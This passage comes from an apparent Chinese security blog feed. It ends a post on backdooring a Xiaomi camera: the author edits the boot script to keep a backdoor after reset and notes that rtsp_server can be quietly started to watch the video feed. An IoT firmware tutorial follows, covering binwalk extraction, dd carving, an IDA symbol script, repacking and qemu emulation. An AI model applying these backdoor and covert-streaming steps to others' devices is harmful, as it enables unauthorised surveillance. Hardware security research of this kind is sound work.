title="后记"></a>后记</h2><p>这个系统竟然可改写，我之前遇见过的摄像头都是不可改写系统。</p><p><img alt="image-20200807193009019" data-src="https://nocbtm.github.io/imgs/image-20200807193009019.png" class="lozad"></p><p>修改一下初始化脚本，植入后门。这里要修改最初始的脚本，如果修改 <code>usr/imi/start.sh</code>重启后会复原</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/bin/run.sh</span><br></pre></td></tr></table></figure><p><img alt="image-20200807200653949" data-src="https://nocbtm.github.io/imgs/image-20200807200653949.png" class="lozad"></p><p>重启一下，连接成功。经检测重置之后后门依然有效</p><p><img alt="image-20200807200400625" data-src="https://nocbtm.github.io/imgs/image-20200807200400625.png" class="lozad"></p><p>而且发现了rtsp_server，再把这个服务悄悄放到初始化脚本里，这样不就随便看监控视频了吗</p><p><img alt="image-20200807202247047" data-src="https://nocbtm.github.io/imgs/image-20200807202247047.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;大致分析&quot;&gt;&lt;a href=&quot;#大致分析&quot; class=&quot;headerlink&quot; title=&quot;大致分析&quot;&gt;&lt;/a&gt;大致分析&lt;/h2&gt;&lt;p&gt;拿到摄像头第一步，拆机，看看有没有uart调试口，找一下flash芯片&lt;/p&gt;
&lt;p&gt;小米做的是真的好，不太好拆，可参考硬核
      
    
    </summary>
    
      <category term="iot" scheme="https://nocbtm.github.io/categories/iot/"/>
    
    
      <category term="iot" scheme="https://nocbtm.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>iot固件的一些操作</title>
    <link href="https://nocbtm.github.io/2020/07/06/iot%E5%85%A5%E9%97%A8-%E5%9B%BA%E4%BB%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/"/>
    <id>https://nocbtm.github.io/2020/07/06/iot入门-固件的一些操作/</id>
    <published>2020-07-06T09:46:47.000Z</published>
    <updated>2021-07-30T07:46:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然通过官网下载固件的方法比较便捷，但是有些厂商并不会提供固件的下载链接，这就需要我们通过其他途径来获取固件。使用从硬件设备提取固件的方法会比较通用（前提是需要有实体机设备），因为固件一般都会存储在 PCB 的某个位置里。将设备拆开之后，找到相应的 flash rom 或者 Nor flash，使用专门的工具（烧写器、编程器）进行固件的提取。</p><p>先认识一下flash文件系统和固件类型</p><h2 id="flash文件系统"><a href="#flash文件系统" class="headerlink" title="flash文件系统"></a>flash文件系统</h2><p>与普通计算机系统不同的是，嵌入式系统往往需要使用低成本的存储器，诸如EEPROM（带电可擦可编程只读存储器）或Nor/Nand Flash等。Nand flash存储器经常可以与NOR Flash存储器互换使用。大多数情况下闪存只是用来存储少量的代码，这时NOR闪存更适合一些，而NAND则是高数据存储密度的理想解决方案。</p><p>Reference:<a href="https://www.cnblogs.com/iriczhao/p/12128451.html" target="_blank" rel="noopener">Nand Flash 和Nor Flash的区别详解</a></p><p>这里列举一些最常见的Flash文件系统，具体如下：</p><h3 id="Squashfs"><a href="#Squashfs" class="headerlink" title="Squashfs"></a>Squashfs</h3><p>SquashFS 是一套基于Linux内核使用的压缩只读文件系统，文件最大支持2^64字节。他是基于GPL协议的开源软件。初始的版本使用gzip压缩，2.6.34版本Linux内核增加了支持LZMA和LZO压缩，并且在2.6.3内核版本上增加支持XZ压缩。OpenWrt以及DD-Wrt的固件使用的就是这种文件系统,多见于4～16MB的Nor型Flash中。</p><h3 id="JFFS-JFFS2"><a href="#JFFS-JFFS2" class="headerlink" title="JFFS/JFFS2"></a>JFFS/JFFS2</h3><p>全名是Journalling Flash File System，是RedHat公司开发的闪存文件系统，最早是为NOR Flash设计的，自2.6版本<br>以后开始支持NAND Flash，极适合用于嵌入式系统，多见于32MB以下的Nor型Flash固件中。它支持三种压缩算法：zlib、rubin以及rtime。</p><h3 id="YAFFS-YAFFS2"><a href="#YAFFS-YAFFS2" class="headerlink" title="YAFFS/YAFFS2"></a>YAFFS/YAFFS2</h3><p>全称为Yet Another Flash File System，是由Aleph One公司发展出来的NAND flash嵌入式文件系统。与JFFS不同的<br>是，YAFFS最初是专门针对Nand型Flash所设计的，对于大容量的Flash读写更有优势，而JFFS在小容量的FLASH中更具优势，两者各有侧重。这种文件系统多见于128MB以上的Nand型Flash固件中。</p><h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><p><img alt="image-20200724150957627" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724150957627.png" class="lozad"></p><p><img alt="image-20200724151101485" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724151101485.png" class="lozad"></p><h2 id="固件类型"><a href="#固件类型" class="headerlink" title="固件类型"></a>固件类型</h2><p>固件就是程序+文件系统的组合，由文件系统将多个程序组合成一个更大、更复杂的二进制文件。当然这里的大小指的是一个相对的概念。很多时候，固件的大小往往只有几MB，而在Windows或Linux上的可执行文件动辄就是几百MB，当然两者是不能比的，相比而言，固件是麻雀虽小，五脏俱全。</p><p>常见的固件类型，大概可分为如下几种：</p><h3 id="裸机程序"><a href="#裸机程序" class="headerlink" title="裸机程序"></a>裸机程序</h3><p>它是组成最简单的固件，也是最容易分析的固件，IDA可以正确识别并分析这种类型的固件。这类的设备可以看作是 “单片机设备”，设备固件中是比较简单的控制、循环逻辑，利用中断、例程来处理外部世界的各种事件，如常见的智能门锁内部固件</p><h3 id="实时操作系统"><a href="#实时操作系统" class="headerlink" title="实时操作系统"></a>实时操作系统</h3><p>面向控制，通信领域的实时操作系统（RTOS），如windriver公司的VxWorks、isi的psos、qnx系统软件公司的qnx、ati的nucieus等</p><p>Vxworks镜像分类</p><ul><li>可加载行VxWorks镜像：存储在开发机上，运行在板上RAM中</li><li>基于ROM的VXWorks镜像：存储在板上ROM，运行在板上RAM中</li><li>ROM驻留的VXWorks镜像：存储 在板上ROM，运行在板上ROM中</li></ul><h3 id="非实时操作系统"><a href="#非实时操作系统" class="headerlink" title="非实时操作系统"></a>非实时操作系统</h3><p>面向消费电子产品的非实时操作系统，包括个人数字助理（pad）、移动电话、机顶盒、电子书、webpone等。系统有Microsoft的WinCE，3Com的Palm，以及Symbian和Google的Andrioid等</p><h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><p>binwak 是一款优秀的固件分析、固件解包工具。可以用来解析绝大多数没有加密的固件，进行解包从而获取到固件的文件系统。</p><p>针对不同的flash文件系统也有不同的工具来解包，比如</p><p>1、Firmware Mod Kit广泛应用于Squashfs类型的固件编辑，支持多款路由器，OpenWrt和DD-Wrt的所有固件，以及TP-Link、ASUS、D-Link的大部分路由型号的固件。</p><p>2、mtd-utils 由于jffs/jffs2和yaffs/yaffs2是基于MTD的文件系统，因此可以使用Linux下的mtd-utils中的内核工具来获得对这两种文件系统的支持</p><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>binwalk通过识别文件头 智能扫描目标文件所有可识别的文件类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk DIR818LW_FW205b03.bin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file DIR818LW_FW205b03.bin </span><br><span class="line">DIR818LW_FW205b03.bin: data</span><br><span class="line">$ binwalk DIR818LW_FW205b03.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/6"</span></span><br><span class="line">120           0x78            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 5451004 bytes</span><br><span class="line">1704056       0x1A0078        PackImg section delimiter tag, little endian size: 8415232 bytes; big endian size: 6848512 bytes</span><br><span class="line">1704088       0x1A0098        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6848463 bytes, 2622 inodes, blocksize: 131072 bytes, created: 2015-07-09 07:38:10</span><br></pre></td></tr></table></figure><p>提取文件</p><p>“-e” 按照预定义的配置文件中的提取方法提取文件</p><p>“-M” 用于根据magic签名扫描结果进行递归提取</p><p>“-d” 用于限制递归提取深度，默认为8</p><p>“-A “ 使用普通可执行操作码签名扫描目标文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me  DIR818LW_FW205b03.bin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -Me DIR818LW_FW205b03.bin </span><br><span class="line"></span><br><span class="line">Scan Time:     2020-07-07 04:04:01</span><br><span class="line">Target File:   /home/iot/Desktop/tools/firmadyne/firmware/DIR818LW_FW205b03.bin</span><br><span class="line">MD5 Checksum:  be061ea71c8714b7c850e0a24291f269</span><br><span class="line">Signatures:    404</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/6"</span></span><br><span class="line">120           0x78            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 5451004 bytes</span><br><span class="line">1704056       0x1A0078        PackImg section delimiter tag, little endian size: 8415232 bytes; big endian size: 6848512 bytes</span><br><span class="line">1704088       0x1A0098        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6848463 bytes, 2622 inodes, blocksize: 131072 bytes, created: 2015-07-09 07:38:10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scan Time:     2020-07-07 04:04:08</span><br><span class="line">Target File:   /home/iot/Desktop/tools/firmadyne/firmware/_DIR818LW_FW205b03.bin-0.extracted/78</span><br><span class="line">MD5 Checksum:  55be7263933b41415e8c7c0fb46e614a</span><br><span class="line">Signatures:    404</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1090373       0x10A345        Cisco IOS microcode, <span class="keyword">for</span> <span class="string">"&amp;0"</span></span><br><span class="line">2934348       0x2CC64C        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">4116512       0x3ED020        Linux kernel version 2.6.30</span><br><span class="line">4153552       0x3F60D0        CRC32 polynomial table, little endian</span><br><span class="line">4653968       0x470390        Neighborly text, <span class="string">"NeighborSolicitstunnel6 init(): can't add protocol"</span></span><br><span class="line">4653988       0x4703A4        Neighborly text, <span class="string">"NeighborAdvertisementst add protocol"</span></span><br><span class="line">4658095       0x4713AF        Neighborly text, <span class="string">"neighbor %.2x%.2x.%.2x:%.2x:%.2x:%.2x:%.2x:%.2x lost on port %d(%s)(%s)"</span></span><br><span class="line">4673787       0x4750FB        HTML document header</span><br><span class="line">4673950       0x47519E        HTML document footer</span><br></pre></td></tr></table></figure><p>提取出的文件如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> _DIR818LW_FW205b03.bin.extracted/</span><br><span class="line">$ ls</span><br><span class="line">1A0098.squashfs  78  78.7z  squashfs-root</span><br><span class="line">$ <span class="built_in">cd</span> squashfs-root/</span><br><span class="line">$ ls</span><br><span class="line">bin  dev  etc  home  htdocs  include  lib  mnt  mydlink  proc  sbin  sys  tmp  usr  var  www</span><br></pre></td></tr></table></figure><h2 id="加密固件解包"><a href="#加密固件解包" class="headerlink" title="加密固件解包"></a>加密固件解包</h2><h3 id="vxwork"><a href="#vxwork" class="headerlink" title="vxwork"></a>vxwork</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ dd <span class="keyword">if</span>=wdr5620v3.bin of=400.lzma bs=1 skip=1024 count=861326</span><br><span class="line">861326+0 records <span class="keyword">in</span></span><br><span class="line">861326+0 records out</span><br><span class="line">861326 bytes (861 kB, 841 KiB) copied, 1.57047 s, 548 kB/s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>=文件名：输入文件名</span><br><span class="line">of=文件名：输出文件名</span><br><span class="line">skip=blocks：从输入文件开头跳过blocks个块后再开始复制</span><br><span class="line">bs=bytes：同时设置读入/输出的块大小为bytes个字节</span><br><span class="line">count= 读取的字节大小</span><br></pre></td></tr></table></figure><p>解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lzma -d 400.lzma</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -s 0xc1100 -n 512 -C bin</span><br></pre></td></tr></table></figure><p>提取符号表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"> </span><br><span class="line">symfile_path = <span class="string">'./C2E3A'</span> <span class="comment">#程序名</span></span><br><span class="line">symbols_table_start = <span class="number">8</span></span><br><span class="line">strings_table_start = <span class="number">0x9d00</span> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> open(symfile_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    symfile_contents = f.read()</span><br><span class="line"> </span><br><span class="line">symbols_table = symfile_contents[symbols_table_start:strings_table_start]</span><br><span class="line">strings_table = symfile_contents[strings_table_start:]</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_string_by_offset</span><span class="params">(offset)</span>:</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> strings_table[offset+index] != <span class="string">'x00'</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> strings_table[offset:offset+index]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_symbols_metadata</span><span class="params">()</span>:</span></span><br><span class="line">    symbols = []</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> xrange(<span class="number">0</span>, len(symbols_table),<span class="number">8</span>):</span><br><span class="line">        symbol_item = symbols_table[offset:offset+<span class="number">8</span>]</span><br><span class="line">        flag = symbol_item[<span class="number">0</span>]</span><br><span class="line">        string_offset = int(symbol_item[<span class="number">1</span>:<span class="number">4</span>].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        string_name = get_string_by_offset(string_offset)</span><br><span class="line">        target_address = int(symbol_item[<span class="number">-4</span>:].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        symbols.append((flag, string_name, target_address))</span><br><span class="line">    <span class="keyword">return</span> symbols</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_symbols</span><span class="params">(symbols_meta_data)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> flag, string_name, target_address <span class="keyword">in</span> symbols_meta_data:</span><br><span class="line">        idc.MakeName(target_address, string_name)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="string">'x54'</span>:</span><br><span class="line">            idc.MakeCode(target_address)</span><br><span class="line">            idc.MakeFunction(target_address)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    symbols_metadata = get_symbols_metadata()</span><br><span class="line">    add_symbols(symbols_metadata)</span><br></pre></td></tr></table></figure><h2 id="固件封装"><a href="#固件封装" class="headerlink" title="固件封装"></a>固件封装</h2><p>firmware-mod-kit 工具包可用于提取固件中的文档系统，然后对其进行修改，并重新打包成固件。我们可以使用它对固件做定制化的修改，但是也有可能被恶意地用于在固件中添加后门等，所以在下载固件时应到官方网站下载，并检查固件是否被修改过。</p><p>该工具包支持以下固件：</p><blockquote><p>DD-WRT v23 tested - versions v23 SP1 and later are compatible (soon older versions too).<br>DD-WRT v24 tested<br>OpenWrt White Russian tested<br>OpenWrt Kamikaze untested (should work) - not really necessary, based on OpenWrt has its Image Builder.<br>FreeWrt untested - should work ok<br>HyperWrt untested<br>Ewrt untested<br>Sveasoft Alchemy untested<br>Sveasoft Talisman untested<br>Linksys / other vendor not supported by scripts yet - haven’t added cramfs handling<br>ASUS WL-330G untested - should work ok<br>ASUS WL-520G untested - should work ok<br>ASUS WL-530G supported<br>ASUS WL-550G untested - should work ok<br>Trendnet TEW-632BRP tested<br>DLink DIR-615 untested<br>many others* untested</p></blockquote><p>可在 <a href="https://code.google.com/archive/p/firmware-mod-kit/" target="_blank" rel="noopener">google code</a> 下载 Firmware Mod Kit v0.99 安装包，然后解压安装，安装前需要先安装相应的依赖库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line"></span><br><span class="line"><span class="variable">$cd</span> firmware-mod-kit/src</span><br><span class="line">$./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><p>firmware-mod-kit 中包含以下几个工具脚本：</p><blockquote><p>extract-firmware.sh：解包固件<br>build-firmware.sh：重新打包固件<br>check_for_upgrade.sh：检查更新<br>unsquashfs_all.sh：解包提取出来的 squashfs 文档</p></blockquote><h2 id="固件对比"><a href="#固件对比" class="headerlink" title="固件对比"></a>固件对比</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bmaia/binwall</span><br><span class="line"></span><br><span class="line">python binwally.py dir1 dir2</span><br></pre></td></tr></table></figure><h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>因为例如 MIPS、ARM 指令集是无法直接在 X86 的指令集机器上直接运行的，所以就需要使用一个模拟环境，可以用 qemu或者Firmadyne来模拟</p><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><p>qemu有系统模式和用户模式。对于只想模拟单个程序的话使用用户模拟即可；对于整个设备（摄像头、路由器等）的环境来说，使用系统模式比较方便</p><h4 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h4><p>以 dir645_FW_103.bin 为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ wget ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP</span><br><span class="line">$ binwalk dir645_FW_103.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/2"</span></span><br><span class="line">112           0x70            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 4237576 bytes</span><br><span class="line">1441904       0x160070        PackImg section delimiter tag, little endian size: 3169792 bytes; big endian size: 6172672 bytes</span><br><span class="line">1441936       0x160090        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6170670 bytes, 2216 inodes, blocksize: 262144 bytes, created: 2012-10-09 10:24:09</span><br><span class="line"></span><br><span class="line">$ binwalk -Me dir645_FW_103.bin </span><br><span class="line">$ ls</span><br><span class="line">dir645_FW_103.bin*  _dir645_FW_103.bin.extracted/</span><br><span class="line">$ file _dir645_FW_103.bin.extracted/squashfs-root/bin/busybox </span><br><span class="line">_dir645_FW_103.bin.extracted/squashfs-root/bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><p>查看<code>squashfs-root/bin/busybox</code>为mips32 静态链接程序,所以用<code>qemu-mips-static</code>来模拟，启动单个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp /usr/bin/qemu-mips-static .</span><br><span class="line">$ sudo chroot . ./qemu-mips-static ./sbin/httpd</span><br></pre></td></tr></table></figure><h4 id="系统模式"><a href="#系统模式" class="headerlink" title="系统模式"></a>系统模式</h4><p>下载不同架构的kernel和文件系统，用来系统模拟。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r -np -nH -R index.html https://people.debian.org/~aurel32/qemu/</span><br></pre></td></tr></table></figure><p><img alt="image-20200707180834331" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200707180834331.png" class="lozad"></p><p>以mips为例</p><p><img alt="image-20200707181153719" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200707181153719.png" class="lozad"></p><p>先在物理机添加个虚拟网卡tap0并配置ip，以便和虚拟机进行通信</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">Set <span class="string">'tap0'</span> persistent and owned by uid 1000</span><br><span class="line">$ ifconfig </span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.137  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::f47c:851e:6b2a:ca13  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:44:85:45  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 1273210  bytes 1632037231 (1.6 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 262339  bytes 15789435 (15.7 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 564  bytes 42862 (42.8 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 564  bytes 42862 (42.8 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">$ sudo ifconfig tap0 192.168.164.139/24</span><br><span class="line">$ ifconfig </span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.137  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::f47c:851e:6b2a:ca13  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:44:85:45  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 1272982  bytes 1632018319 (1.6 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 262111  bytes 15770766 (15.7 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 544  bytes 41616 (41.6 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 544  bytes 41616 (41.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">tap0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.139  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::2054:a3ff:fead:808f  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 22:54:a3:ad:80:8f  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 17  bytes 3330 (3.3 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 5  bytes 430 (430.0 B)</span><br><span class="line">        TX errors 0  dropped 3 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>需要注意的是配置的tap0的ip要和本地ip在同一个网段，如果配置错误，可以<code>sudo tunctl -d tap0</code>删除重新配置</p><p>然后启动虚拟机，虚拟机默认用户密码为root/root，登录后我们需要配置虚拟机ip地址与tap0也在同一网段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 